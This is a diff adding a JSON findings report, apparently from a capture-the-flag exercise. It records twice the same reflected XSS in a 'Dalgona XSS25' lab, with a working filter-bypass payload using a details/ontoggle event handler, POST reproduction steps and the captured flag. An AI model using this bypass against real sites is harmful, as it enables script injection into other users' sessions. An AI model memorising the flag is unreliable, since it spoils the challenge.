@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T13:57:32.845682+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "11d7eec1-746e-4176-a09f-2d227a2c79fe",
+      "timestamp": "2026-04-14T13:57:32.845571+00:00",
+      "title": "XSS Vulnerability in Dalgona Challenge XSS25",
+      "severity": "high",
+      "target": "http://172.17.0.1:38709/xss25",
+      "description": "Reflected XSS vulnerability in the solution input field. The application filters 'script', 'onerror', 'onload', and single quotes but allows other event handlers like ontoggle with double quotes.",
+      "evidence": "flag{6fdb8636-6391-4863-a64a-f5d138d2ebbc}",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /xss25 with body solution=<details open ontoggle=alert(\"XSS\")>",
+        "expected": "Flag returned in response"
+      }
+    },
+    {
+      "id": "07de0498-adb6-4f20-a1c5-84cb1633a0a0",
+      "timestamp": "2026-04-14T13:57:32.854874+00:00",
+      "title": "XSS Vulnerability in Dalgona Challenge XSS25",
+      "severity": "high",
+      "target": "http://172.17.0.1:38709/xss25",
+      "description": "Reflected XSS vulnerability in the solution input field. The application filters 'script', 'onerror', 'onload', and single quotes but allows other event handlers like ontoggle with double quotes.",
+      "evidence": "flag{6fdb8636-6391-4863-a64a-f5d138d2ebbc}",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /xss25 with body solution=<details open ontoggle=alert(\"XSS\")>",
+        "expected": "Flag returned in response"
+      }
+    }
+  ],
+  "diagrams": []
+}
